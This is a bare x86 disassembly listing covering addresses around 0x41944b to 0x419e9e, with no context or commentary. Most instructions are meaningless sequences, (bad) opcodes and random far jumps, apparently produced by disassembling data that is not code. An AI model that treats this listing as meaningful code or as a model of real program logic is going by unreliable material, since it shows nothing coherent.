  41944b:	xchg   esp,eax
  41944c:	ficomp DWORD PTR [ebx]
  41944e:	push   ss
  41944f:	pop    esp
  419450:	cmp    DWORD PTR [eax],ebp
  419452:	(bad)  
  419453:	adc    eax,DWORD PTR [edi+edx*2-0x556162a9]
  41945a:	ret    
  41945b:	lock cmp BYTE PTR [ebp+0x73],ch
  41945f:	stc    
  419460:	jg     0x4194a3
  419462:	stos   DWORD PTR es:[edi],eax
  419463:	es mov al,ds:0xc5c7c4de
  41946a:	dec    edx
  41946b:	mov    DWORD PTR ds:0xd3,ebx
	...
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	je     0x41955d
  4194e4:	dec    ecx
  4194e5:	xor    ah,BYTE PTR [edi+0x10]
  4194e8:	add    DWORD PTR [eax],eax
  4194ea:	add    BYTE PTR [ecx],al
  4194ec:	add    BYTE PTR [eax],al
  4194ee:	mov    BYTE PTR [esi-0x6a],al
  4194f1:	sub    al,0x95
  4194f3:	cmp    al,0x5a
  4194f5:	imul   ebp,DWORD PTR [ebp-0x73aa791],0x2
  4194fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194fd:	ja     0x419550
  4194ff:	xor    edi,DWORD PTR [edx+0x65b3365d]
  419505:	call   0xc50e:0x11111911
  41950c:	ror    eax,1
  41950e:	or     dl,BYTE PTR [ebp+ecx*2+0x723593eb]
  419515:	cmc    
  419516:	(bad)  
  419517:	xor    eax,0x25466563
  41951c:	push   esp
  41951d:	adc    ebx,DWORD PTR [ebx-0x1c]
  419520:	fisubr WORD PTR [esi-0x7b]
  419523:	mov    ecx,0x39e367b0
  419528:	jno    0x419572
  41952a:	test   DWORD PTR [ecx-0x7a937c52],esi
  419530:	adc    DWORD PTR [ecx-0x1becc55f],edi
  419536:	sbb    ebp,DWORD PTR [ebx+0x70]
  419539:	fs inc esp
  41953b:	inc    esi
  41953c:	jae    0x419546
  41953e:	add    eax,0x49e351eb
  419543:	cld    
  419544:	in     al,dx
  419545:	fcomi  st,st(7)
  419547:	push   cs
  419548:	fdiv   st,st(3)
  41954a:	test   DWORD PTR [edx-0x6d],edx
  41954d:	mov    ?,WORD PTR ds:0x13cc9448
  419553:	add    BYTE PTR [eax],bh
  419555:	addr16 and al,0x60
  419558:	arpl   WORD PTR [eax+0x47],ax
  41955b:	mov    DWORD PTR [edx],ebp
  41955d:	xor    al,0x7c
  41955f:	sub    BYTE PTR [edi],bl
  419561:	fadd   st,st(3)
  419563:	adc    BYTE PTR [ebx+eax*4],bh
  419566:	shl    ebp,0xbd
  419569:	and    edx,DWORD PTR [eax+edi*4]
  41956c:	arpl   WORD PTR [edx-0x1b4556b0],bx
  419572:	xor    edi,eax
  419574:	js     0x419596
  419576:	stos   DWORD PTR es:[edi],eax
  419577:	add    edi,edi
  419579:	loope  0x41950a
  41957b:	(bad)  
  41957c:	pop    ds
  41957d:	stc    
  41957e:	xchg   edx,eax
  41957f:	jecxz  0x4195de
  419581:	cs xchg esi,eax
  419583:	pop    ebx
  419584:	in     eax,0x35
  419586:	lahf   
  419587:	sub    al,0x93
  419589:	jno    0x41950d
  41958b:	inc    esi
  41958c:	adc    edi,DWORD PTR [ecx-0x33]
  41958f:	mov    WORD PTR [esi-0x32781e26],cs
  419595:	leave  
  419596:	(bad)  
  419598:	mov    ebx,0xf9efb8b0
  41959d:	cmp    DWORD PTR [esi+0x4d1896f8],edi
  4195a3:	retf   0x70bd
  4195a6:	sub    DWORD PTR [ebx],ecx
  4195a8:	xor    al,0x5d
  4195aa:	stos   BYTE PTR es:[edi],al
  4195ab:	mov    ecx,0x4b5a67ba
  4195b0:	(bad)  
  4195b1:	xchg   edx,eax
  4195b2:	les    edi,FWORD PTR [esi]
  4195b4:	sub    al,0xf4
  4195b6:	pop    ebp
  4195b7:	sub    BYTE PTR [ebp-0x63],0x5d
  4195bb:	mov    esi,0x56e2e046
  4195c0:	push   es
  4195c1:	sbb    al,0x92
  4195c3:	dec    ebx
  4195c4:	div    DWORD PTR [esi]
  4195c6:	cwde   
  4195c7:	sub    eax,0x36eeefed
  4195cc:	mov    ds:0x7d063f4d,al
  4195d1:	aas    
  4195d2:	dec    edx
  4195d3:	xor    bh,BYTE PTR [eiz*2-0x1d1d0e42]
  4195da:	push   ebp
  4195db:	add    dh,BYTE PTR [eax-0x74464068]
  4195e1:	push   0x33
  4195e3:	out    dx,al
  4195e4:	out    dx,al
  4195e5:	(bad)  
  4195e6:	cmp    BYTE PTR [eax-0x68119a40],cl
  4195ec:	add    al,0x1f
	...
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	and    bl,BYTE PTR [ebx+0x3f]
  419665:	xor    ah,BYTE PTR [edi+0x11]
  419668:	add    DWORD PTR [eax],eax
  41966a:	add    BYTE PTR [ecx],al
  41966c:	add    BYTE PTR [eax],al
  41966e:	sub    al,0x97
  419670:	cwde   
  419671:	stos   DWORD PTR es:[edi],eax
  419672:	dec    DWORD PTR [ecx]
  419674:	ror    DWORD PTR ds:[eax+0x42],1
  419678:	dec    eax
  419679:	rol    BYTE PTR [edi],0xf4
  41967c:	jne    0x41961c
  41967e:	jge    0x41965b
  419680:	pop    ss
  419681:	jbe    0x4196ea
  419683:	test   DWORD PTR [edi+0x7edb9c40],eax
  419689:	cmp    eax,0xfb815546
  41968e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41968f:	aas    
  419690:	or     DWORD PTR [ecx],esp
  419692:	lods   al,BYTE PTR ds:[esi]
  419693:	fsub   st(0),st
  419695:	test   eax,0xd65f2280
  41969a:	mov    eax,0x7afa7ea7
  41969f:	mov    ds:0xf0b270cd,al
  4196a4:	das    
  4196a5:	sub    BYTE PTR [edx],dl
  4196a7:	loope  0x4196bf
  4196a9:	sub    DWORD PTR [ecx+ebx*2+0x44779f80],ebx
  4196b0:	int3   
  4196b1:	rcr    BYTE PTR [ebp+0x13],cl
  4196b4:	push   ebp
  4196b5:	mov    esi,DWORD PTR fs:[ebx+edi*4-0x42]
  4196ba:	jmp    0x419707
  4196bc:	lods   al,BYTE PTR ds:[esi]
  4196bd:	(bad)  
  4196be:	sub    eax,0x713a6bb4
  4196c3:	xchg   edx,ebp
  4196c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c6:	add    al,0xb8
  4196c8:	push   0x75
  4196ca:	push   ds
  4196cb:	push   ecx
  4196cc:	xchg   edx,eax
  4196cd:	or     cl,cl
  4196cf:	repnz mov edx,0x4f27fe59
  4196d5:	cmp    BYTE PTR [edx+esi*8],ch
  4196d8:	fmul   st(4),st
  4196da:	mov    BYTE PTR [ecx+0x59],bl
  4196dd:	xchg   edx,eax
  4196de:	mov    bh,0x5c
  4196e0:	(bad)  
  4196e1:	mov    ds:0x13ccaab4,al
  4196e6:	repnz loopne 0x4196a0
  4196e9:	jg     0x419675
  4196eb:	out    dx,al
  4196ec:	lds    ebp,FWORD PTR [edi+ecx*4-0x68]
  4196f0:	and    cl,ah
  4196f2:	pop    ebp
  4196f3:	hlt    
  4196f4:	lds    ebp,FWORD PTR [ebp+0x2f3bc7ba]
  4196fa:	pop    edx
  4196fb:	mov    ds:0x8c10eea8,eax
  419700:	sbb    dh,BYTE PTR [ecx+eax*8]
  419703:	jbe    0x41973d
  419705:	mov    ch,0x65
  419707:	fldz   
  419709:	pop    edx
  41970a:	fadd   DWORD PTR [esi]
  41970c:	cmp    ch,dl
  41970e:	inc    edi
  41970f:	mov    ebp,DWORD PTR [ebp+ebx*8-0x6d0951ff]
  419716:	in     eax,dx
  419717:	dec    eax
  419718:	dec    edi
  419719:	push   0x71b5944f
  41971e:	stos   BYTE PTR es:[edi],al
  41971f:	cdq    
  419720:	outs   dx,BYTE PTR ds:[esi]
  419721:	mov    bl,0x2
  419723:	lods   al,BYTE PTR ds:[esi]
  419724:	add    eax,DWORD PTR [eax]
  419726:	xchg   ebx,eax
  419727:	arpl   WORD PTR [esp+ebp*4],bp
  41972a:	push   ecx
  41972b:	inc    edx
  41972c:	aam    0x78
  41972e:	xchg   edx,eax
  41972f:	pop    edx
  419730:	lds    eax,FWORD PTR [esi]
  419732:	retf   0xed40
  419735:	int    0xd7
  419737:	pop    esp
  419738:	jbe    0x4197ad
  41973a:	pushf  
  41973b:	push   esp
  41973c:	jecxz  0x419788
  41973e:	cli    
  41973f:	and    BYTE PTR [eax+0x5b],ah
  419742:	rol    BYTE PTR [eax-0x13cb9401],1
  419748:	daa    
  419749:	je     0x4197ac
  41974b:	mov    dl,0x9b
  41974d:	xor    al,0xcc
  41974f:	retf   0xf655
  419752:	repnz scas al,BYTE PTR es:[edi]
  419754:	mov    edi,DWORD PTR [eax]
  419756:	adc    BYTE PTR [ebx+0x4],cl
  419759:	stc    
  41975a:	fwait
  41975b:	clc    
  41975c:	aam    0x1f
  41975e:	push   ecx
  41975f:	and    eax,0xf1578ac4
  419764:	hlt    
  419765:	dec    cl
  419767:	add    eax,0x46f91dab
  41976c:	ins    DWORD PTR es:[edi],dx
  41976d:	sub    eax,DWORD PTR [eax]
	...
  4197d3:	add    BYTE PTR [eax],al
  4197d5:	add    BYTE PTR [ebx-0x29a8ec1],dh
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xc68dd0ae
  4197e3:	ins    BYTE PTR es:[edi],dx
  4197e4:	clc    
  4197e5:	stc    
  4197e6:	adc    al,BYTE PTR [bx+di]
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    BYTE PTR [ecx+0x6638752a],bh
  4197f3:	and    al,0x98
  4197f5:	cmp    dh,BYTE PTR [edx-0x6c]
  4197f8:	test   al,0xd9
  4197fa:	popf   
  4197fb:	xor    ebp,DWORD PTR [ecx+ebp*8+0x3061a646]
  419802:	ror    BYTE PTR [ebx+0x6a],1
  419805:	jne    0x4197f5
  419807:	loope  0x4197ed
  419809:	imul   edx,eax,0xd20d6b12
  41980f:	adc    al,0x3c
  419811:	inc    edx
  419812:	pop    eax
  419813:	cdq    
  419814:	fldenv [edi]
  419816:	call   DWORD PTR [eax+0x6355d0be]
  41981c:	mov    edi,0x64214787
  419821:	mov    dh,0x6d
  419823:	sub    ebx,edi
  419825:	add    dl,BYTE PTR [ebx-0x4de566a9]
  41982b:	pop    esi
  41982c:	ds (bad) 
  41982e:	imul   DWORD PTR [edi-0x67facab0]
  419834:	ins    DWORD PTR es:[edi],dx
  419835:	cs pop eax
  419837:	out    0x92,eax
  419839:	xchg   esp,eax
  41983a:	out    0x7e,al
  41983c:	dec    ebp
  41983d:	dec    edi
  41983e:	or     eax,0xdaab5826
  419843:	xchg   ebx,eax
  419844:	inc    edi
  419845:	jmp    FWORD PTR [edx+0x21]
  419848:	in     eax,dx
  419849:	outs   dx,BYTE PTR ds:[esi]
  41984a:	add    cl,BYTE PTR [ebx]
  41984c:	push   edx
  41984d:	int    0xa
  41984f:	xchg   edi,eax
  419850:	dec    edx
  419851:	scas   al,BYTE PTR es:[edi]
  419852:	xor    eax,0x4dbf3b2b
  419857:	cli    
  419858:	mov    fs:0xe7a6a6,al
  41985e:	sbb    eax,0x95577756
  419863:	test   DWORD PTR [edx-0x52fd5d2a],eax
  419869:	xchg   ebp,eax
  41986a:	ins    DWORD PTR es:[edi],dx
  41986b:	sub    al,0x81
  41986d:	rol    DWORD PTR [esi+edx*8],1
  419870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419871:	push   0x73cfc81a
  419876:	push   edi
  419877:	leave  
  419878:	sahf   
  419879:	outs   dx,BYTE PTR ds:[esi]
  41987a:	xchg   ecx,eax
  41987b:	xchg   edi,eax
  41987c:	push   esp
  41987d:	pop    ds
  41987e:	out    dx,al
  41987f:	cwde   
  419880:	push   0x61
  419882:	(bad)  
  419883:	cmc    
  419884:	push   ebx
  419885:	ja     0x4198b1
  419887:	dec    ecx
  419888:	mov    ch,0x7a
  41988a:	bound  edx,QWORD PTR [ebp-0x58]
  41988d:	outs   dx,BYTE PTR ds:[esi]
  41988e:	jae    0x41985a
  419890:	or     bl,BYTE PTR [ebp-0x7c]
  419893:	pop    esi
  419894:	jge    0x41984d
  419896:	push   eax
  419897:	xor    DWORD PTR [ebp+eax*8-0x4f],esp
  41989b:	shr    BYTE PTR [eax],1
  41989d:	and    BYTE PTR [edx-0x93511f4],al
  4198a3:	or     DWORD PTR ds:0x5116760c,ebp
  4198a9:	retf   0x24fa
  4198ac:	scas   al,BYTE PTR es:[edi]
  4198ad:	stc    
  4198ae:	sbb    ecx,DWORD PTR [eax]
  4198b0:	push   esp
  4198b1:	jnp    0x4198cd
  4198b3:	(bad)  
  4198b4:	js     0x419927
  4198b6:	fstp   DWORD PTR [edi]
  4198b8:	test   eax,0xace2a910
  4198bd:	pop    esi
  4198be:	mov    bh,0x99
  4198c0:	push   es
  4198c1:	fld    TBYTE PTR [esi]
  4198c3:	idiv   BYTE PTR [eax]
  4198c5:	sub    dh,cl
  4198c7:	mov    ah,0xfd
  4198c9:	cmp    BYTE PTR [ebx-0x791e7d57],ch
  4198cf:	xchg   ecx,eax
  4198d0:	push   edi
  4198d1:	push   ecx
  4198d2:	div    DWORD PTR [edx+0x0]
  4198d5:	mov    bl,0x31
  4198d7:	mov    esp,0xe45492df
  4198dc:	jno    0x41987b
  4198de:	fmul   QWORD PTR [ebp+0x79]
  4198e1:	mov    DWORD PTR [edx+0x6f],edx
  4198e4:	cmp    ah,BYTE PTR [edi]
  4198e6:	addr16 jmp 0x36d4933d
  4198ec:	cmp    DWORD PTR [edx],0x0
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fisttp QWORD PTR [ebx+0x67c6abc6]
  419967:	adc    eax,DWORD PTR [ecx]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [eax-0x66967fe2],dh
  419973:	in     al,dx
  419974:	mov    cl,0xbe
  419976:	jnp    0x4199ae
  419978:	scas   eax,DWORD PTR es:[edi]
  419979:	pop    ss
  41997a:	test   BYTE PTR [edi],cl
  41997c:	pop    eax
  41997d:	adc    al,cl
  41997f:	xchg   edi,eax
  419981:	or     edx,DWORD PTR cs:[eax+0x47]
  419985:	add    BYTE PTR [edi+0x4e25a8ea],al
  41998b:	inc    ecx
  41998c:	rcl    BYTE PTR [edi+0x6760e36c],cl
  419992:	jno    0x419963
  419994:	dec    ebx
  419995:	lock pop ebp
  419997:	add    esp,esp
  419999:	or     esp,DWORD PTR [edi-0x5a]
  41999c:	lds    edx,FWORD PTR [esi]
  41999e:	and    al,0x23
  4199a0:	pop    esp
  4199a1:	fdiv   st,st(2)
  4199a3:	inc    ebx
  4199a4:	jg     0x419991
  4199a6:	pop    ebp
  4199a7:	inc    esi
  4199a8:	cmp    DWORD PTR ds:0x9e4644bb,edx
  4199ae:	ret    0xeb86
  4199b1:	xor    BYTE PTR [ecx-0x698813],dh
  4199b7:	xchg   ebp,eax
  4199b8:	jge    0x4199eb
  4199ba:	aas    
  4199bb:	int3   
  4199bc:	fld    QWORD PTR [edi]
  4199be:	ret    
  4199bf:	fiadd  WORD PTR [ecx-0x50956f83]
  4199c5:	and    BYTE PTR [edx],0x1c
  4199c8:	scas   eax,DWORD PTR es:[edi]
  4199c9:	adc    al,0xbd
  4199cb:	add    ebp,DWORD PTR [esi]
  4199cd:	daa    
  4199ce:	mov    ebp,0xacd1570f
  4199d3:	mov    ebx,0x41571871
  4199d8:	aaa    
  4199d9:	and    al,0x6f
  4199db:	sbb    eax,DWORD PTR [eax]
  4199dd:	stos   DWORD PTR es:[edi],eax
  4199de:	jle    0x419960
  4199e0:	mov    ebp,0x4e3dd6f3
  4199e5:	in     eax,0xb8
  4199e7:	enter  0x338f,0x20
  4199eb:	pop    ds
  4199ec:	cmp    BYTE PTR ds:0xcbe88ece,bl
  4199f2:	jns    0x419a27
  4199f4:	enter  0x914,0x41
  4199f8:	and    eax,ebx
  4199fa:	sar    ebx,0x5d
  4199fd:	pop    ebx
  4199fe:	in     eax,dx
  4199ff:	push   esi
  419a00:	mov    ds:0x668bdb62,al
  419a05:	inc    ebx
  419a06:	fidiv  DWORD PTR [ecx]
  419a08:	jae    0x4199bb
  419a0a:	xor    al,0xc2
  419a0c:	jmp    0xc102:0x400e0d99
  419a13:	aam    0x4d
  419a15:	(bad)  
  419a16:	addr16 icebp 
  419a18:	test   BYTE PTR [edx-0x64],al
  419a1b:	retf   0x287a
  419a1e:	sar    DWORD PTR [ecx],1
  419a20:	mov    ecx,0xaf44c3af
  419a25:	pop    esp
  419a26:	pop    ebp
  419a27:	jno    0x4199c8
  419a29:	inc    edi
  419a2a:	xor    dl,ch
  419a2c:	xchg   DWORD PTR [esi],esp
  419a2e:	stos   BYTE PTR es:[edi],al
  419a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a30:	popa   
  419a31:	xchg   BYTE PTR [bp+di+0x77a],cl
  419a36:	xor    eax,0x324071bf
  419a3b:	push   edi
  419a3c:	xor    eax,DWORD PTR [ecx]
  419a3e:	jp     0x419a7b
  419a40:	ret    
  419a41:	lock jmp DWORD PTR [edx+0x649e8194]
  419a48:	outs   dx,DWORD PTR ds:[esi]
  419a49:	das    
  419a4a:	lahf   
  419a4b:	sbb    DWORD PTR [edi],0x9c3e43a1
  419a51:	ret    
  419a52:	lahf   
  419a53:	push   0x3a
  419a55:	push   ds
  419a56:	mov    ?,edi
  419a58:	dec    esi
  419a59:	fdivr  QWORD PTR [ebp+0x111ba944]
  419a5f:	ins    DWORD PTR es:[edi],dx
  419a60:	loope  0x419a3a
  419a62:	cmp    dh,cl
  419a64:	xchg   ebx,eax
  419a65:	jb     0x419a77
  419a67:	cli    
  419a68:	and    eax,0x32e802af
  419a6d:	push   esi
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0x421e84c2,cl
  419ae5:	addr16 addr16 adc al,0x1
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    BYTE PTR [esi-0x1],bh
  419af0:	aam    0xe7
  419af2:	sub    eax,0x7f2a84ab
  419af7:	xlat   BYTE PTR ds:[ebx]
  419af8:	addr16 adc al,0x26
  419afb:	arpl   di,ax
  419afd:	mov    eax,0xd5031acb
  419b02:	das    
  419b03:	jbe    0x419acb
  419b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b06:	xchg   ecx,eax
  419b07:	sbb    al,0x40
  419b09:	in     al,0x1b
  419b0b:	mov    bl,ch
  419b0d:	es test bl,0x43
  419b11:	(bad)  
  419b12:	and    DWORD PTR [esp+esi*4+0x58],eax
  419b16:	(bad)  
  419b18:	jp     0x419ab4
  419b1a:	mov    ebp,0xa9f3db7a
  419b1f:	inc    ebx
  419b20:	adc    ah,ah
  419b22:	gs sub dl,cl
  419b25:	pop    ds
  419b26:	cmp    al,0x47
  419b28:	inc    eax
  419b29:	aam    0x7b
  419b2b:	shl    DWORD PTR [esi],cl
  419b2d:	cli    
  419b2e:	dec    ebp
  419b2f:	arpl   dx,dx
  419b31:	cmc    
  419b32:	push   eax
  419b33:	xor    ecx,ebp
  419b35:	pop    ss
  419b36:	outs   dx,BYTE PTR ds:[esi]
  419b37:	out    0x33,al
  419b39:	pusha  
  419b3a:	lods   al,BYTE PTR ds:[esi]
  419b3b:	int    0x51
  419b3d:	jo     0x419ad3
  419b3f:	int    0xf1
  419b41:	sahf   
  419b42:	xchg   ebx,eax
  419b43:	sub    BYTE PTR [edi+esi*4],bh
  419b46:	test   al,0xde
  419b48:	inc    edx
  419b49:	cmp    al,0x42
  419b4b:	cmp    DWORD PTR [ecx+0x2725682f],eax
  419b51:	in     eax,0xfc
  419b53:	jecxz  0x419b78
  419b55:	sub    eax,0x84db67f1
  419b5a:	pop    ds
  419b5b:	mov    esp,0x713ca18e
  419b60:	out    dx,al
  419b61:	adc    eax,0xc48a02c4
  419b66:	je     0x419bbf
  419b68:	and    eax,0xaf0913f0
  419b6d:	cld    
  419b6e:	mov    ebx,0x85d842fd
  419b73:	and    eax,0x6ccc3f89
  419b78:	sti    
  419b79:	mov    ecx,0x1778ae47
  419b7e:	cwde   
  419b7f:	cmp    eax,0x897c0a72
  419b84:	shr    BYTE PTR [edi+0x71df740c],1
  419b8a:	ins    BYTE PTR es:[edi],dx
  419b8b:	mov    bh,0x8b
  419b8d:	or     ebp,edx
  419b8f:	pop    ds
  419b90:	scas   eax,DWORD PTR es:[edi]
  419b91:	imul   ecx,DWORD PTR [esi+0x49816fea],0xffffffa5
  419b98:	mov    esi,0xe8959b46
  419b9d:	inc    edi
  419b9e:	(bad)  
  419b9f:	and    al,0x26
  419ba1:	stos   DWORD PTR es:[edi],eax
  419ba2:	add    eax,0xeece3f01
  419ba7:	imul   esi
  419ba9:	int    0x24
  419bab:	cs mov dl,0x4a
  419bae:	test   edi,0xa10de9b8
  419bb4:	les    ebp,FWORD PTR [ecx+0x6d03174b]
  419bba:	sub    ebp,DWORD PTR [edi]
  419bbc:	ins    BYTE PTR es:[edi],dx
  419bbd:	pusha  
  419bbe:	push   0x1
  419bc0:	sbb    DWORD PTR [ecx-0x449ffeac],ecx
  419bc6:	inc    eax
  419bc7:	sbb    DWORD PTR [ecx-0x37],ebp
  419bca:	xchg   esi,eax
  419bcb:	or     esi,ecx
  419bcd:	push   esi
  419bce:	sahf   
  419bcf:	sub    eax,DWORD PTR [edi-0x7adf16ce]
  419bd5:	xor    ch,bl
  419bd7:	and    eax,0x42db9010
  419bdc:	adc    DWORD PTR [ebx+0x8963a9a],ebx
  419be2:	call   0xcb15:0x99b93448
  419be9:	ret    0x91a6
  419bec:	dec    esp
  419bed:	mov    edx,0x0
	...
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x46
  419c63:	imul   ebx,DWORD PTR [ecx],0xffffffaf
  419c66:	addr16 adc eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	or     ch,BYTE PTR [eax+0x4a]
  419c71:	jg     0x419cc0
  419c73:	or     ebp,DWORD PTR [ebx]
  419c75:	jb     0x419cc5
  419c77:	add    eax,0x733b454
  419c7c:	mov    ah,0xe3
  419c7e:	ret    
  419c7f:	push   edi
  419c80:	loopne 0x419c5e
  419c82:	ja     0x419c94
  419c84:	mov    ch,0x24
  419c86:	pop    es
  419c87:	sbb    dl,BYTE PTR [ecx]
  419c89:	test   eax,0x92ab27aa
  419c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c8f:	jns    0x419c6a
  419c91:	cmp    BYTE PTR [ebp-0x3504783f],0xb2
  419c98:	cwd    
  419c9a:	aam    0xa6
  419c9c:	adc    ecx,DWORD PTR [ebx-0x77]
  419c9f:	or     DWORD PTR [ebx],edi
  419ca1:	push   esi
  419ca2:	sbb    al,0xb8
  419ca4:	and    DWORD PTR ds:0xb22d846f,edi
  419caa:	bound  ebx,QWORD PTR [ecx+edi*2-0x3762e4d2]
  419cb1:	push   ds
  419cb2:	and    esi,DWORD PTR [esi+ebx*4]
  419cb5:	mov    bh,0x6a
  419cb7:	repnz pusha 
  419cb9:	fwait
  419cba:	mov    ecx,0xe49296c9
  419cbf:	sbb    DWORD PTR [edx+0x7],ebp
  419cc2:	pusha  
  419cc3:	ror    BYTE PTR [esi-0x72],1
  419cc6:	inc    esi
  419cc7:	(bad)  
  419cc8:	jg     0x419d36
  419cca:	xchg   ebx,eax
  419ccb:	mov    eax,0x22dd1896
  419cd0:	fdivr  QWORD PTR [edx]
  419cd2:	and    ebp,0x7f303d19
  419cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd9:	pop    edi
  419cda:	cwde   
  419cdb:	clc    
  419cdc:	pop    ds
  419cdd:	test   BYTE PTR [ebx+0x2a381a4c],ah
  419ce3:	lea    ecx,[ecx+0x66994a57]
  419ce9:	stos   BYTE PTR es:[edi],al
  419cea:	jb     0x419d63
  419cec:	and    eax,0x241a508e
  419cf1:	fst    st(3)
  419cf3:	daa    
  419cf4:	imul   edi,DWORD PTR [ecx+0x3e],0xb6f11014
  419cfb:	imul   edx,DWORD PTR ds:0xe13a0148,0xffffff94
  419d02:	int    0xdb
  419d04:	mov    ah,0xce
  419d06:	(bad)  
  419d07:	lods   al,BYTE PTR ds:[esi]
  419d08:	ret    0xa154
  419d0b:	cs inc edx
  419d0d:	int    0x39
  419d0f:	inc    eax
  419d10:	lods   eax,DWORD PTR ds:[esi]
  419d11:	pop    eax
  419d12:	js     0x419ce4
  419d14:	inc    edi
  419d15:	xchg   ebx,eax
  419d16:	mov    DWORD PTR [edx+eiz*2+0x27b5e367],esi
  419d1d:	jmp    0x338e162a
  419d22:	add    al,0x6a
  419d24:	cs loope 0x419d5a
  419d27:	push   ss
  419d28:	out    dx,al
  419d29:	pop    eax
  419d2a:	jns    0x419d12
  419d2c:	ret    0xc538
  419d2f:	imul   eax,DWORD PTR [eax],0xd162a431
  419d35:	popf   
  419d36:	call   0x906d:0x9555c3de
  419d3d:	adc    eax,0x964ec77f
  419d42:	jns    0x419d8c
  419d44:	ds dec ebp
  419d46:	ret    0x5c24
  419d49:	and    al,0x9c
  419d4b:	imul   edx,DWORD PTR [edx-0x738b5dfc],0x38699932
  419d55:	adc    edx,DWORD PTR [esi]
  419d57:	fisub  DWORD PTR [ebx+0x10]
  419d5a:	or     esi,DWORD PTR [edx-0xd79d06a]
  419d60:	outs   dx,DWORD PTR ds:[esi]
  419d61:	dec    ecx
  419d62:	or     eax,0x24a3d1f8
  419d67:	aam    0xdf
  419d69:	test   eax,0xf88d0d3a
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fiadd  DWORD PTR ss:[ebp+0x39]
  419de4:	cwde   
  419de5:	and    esp,DWORD PTR [edi+0x16]
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	add    BYTE PTR [ebx+0x7298f75b],cl
  419df4:	and    bl,BYTE PTR [ecx+0x55]
  419df7:	lock mov ds:0xc4098360,ax
  419dfe:	mov    bh,0xc5
  419e00:	xor    al,0xef
  419e02:	ret    0x691
  419e05:	scas   al,BYTE PTR es:[edi]
  419e06:	inc    ebx
  419e07:	outs   dx,BYTE PTR ds:[esi]
  419e08:	add    cl,dl
  419e0a:	out    dx,eax
  419e0b:	leave  
  419e0c:	xchg   edx,eax
  419e0d:	sar    DWORD PTR [edx-0x3c],0x5c
  419e11:	pop    es
  419e12:	push   cs
  419e13:	inc    edx
  419e14:	popf   
  419e15:	loope  0x419e11
  419e17:	mov    DWORD PTR [esi+0x2a],ecx
  419e1a:	sti    
  419e1b:	sbb    eax,0x599bfd43
  419e20:	mov    bh,0x9c
  419e22:	out    dx,eax
  419e23:	fst    st(3)
  419e25:	lds    esp,FWORD PTR [esi]
  419e27:	jnp    0x419de8
  419e29:	push   ebp
  419e2a:	or     eax,0x537c6db
  419e2f:	push   ecx
  419e30:	xchg   edx,eax
  419e31:	xor    al,0xd6
  419e33:	add    ch,BYTE PTR [ecx-0x32]
  419e36:	jle    0x419e3c
  419e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e39:	jnp    0x419dd5
  419e3b:	sub    al,0x83
  419e3d:	xor    BYTE PTR [edx+0x5c],bh
  419e40:	call   0xd9d6:0xa9940f05
  419e47:	stos   DWORD PTR es:[edi],eax
  419e48:	aad    0x93
  419e4a:	retf   0x698e
  419e4d:	in     eax,0x20
  419e4f:	inc    ebx
  419e50:	add    BYTE PTR [ebx],bh
  419e52:	ret    
  419e53:	imul   BYTE PTR [esp+edi*2]
  419e56:	jne    0x419e47
  419e58:	pushf  
  419e59:	loopne 0x419e4d
  419e5b:	gs rcr dl,0x6e
  419e5f:	sbb    al,0x85
  419e61:	or     DWORD PTR [edi-0x4f],edi
  419e64:	adc    al,0xa2
  419e66:	fisub  DWORD PTR [ebx+0x12a63be0]
  419e6c:	loop   0x419ee4
  419e6e:	pushf  
  419e6f:	mov    BYTE PTR [edx-0x53],bl
  419e72:	push   eax
  419e73:	push   edi
  419e74:	mov    ds:0x6edfff76,al
  419e79:	aaa    
  419e7a:	push   esp
  419e7b:	jne    0x419e04
  419e7d:	pop    esp
  419e7e:	stos   BYTE PTR es:[edi],al
  419e7f:	and    bh,bh
  419e81:	xchg   edx,eax
  419e82:	mov    esi,0x1f523ff3
  419e87:	in     al,0xac
  419e89:	fs sahf 
  419e8b:	scas   al,BYTE PTR es:[edi]
  419e8c:	xchg   ecx,eax
  419e8d:	adc    eax,0x19a99572
  419e92:	and    al,0x42
  419e94:	and    BYTE PTR [edx-0x7c],bh
  419e97:	loop   0x419e7b
  419e99:	jmp    0x2a96e638
  419e9e:	aad    0x26
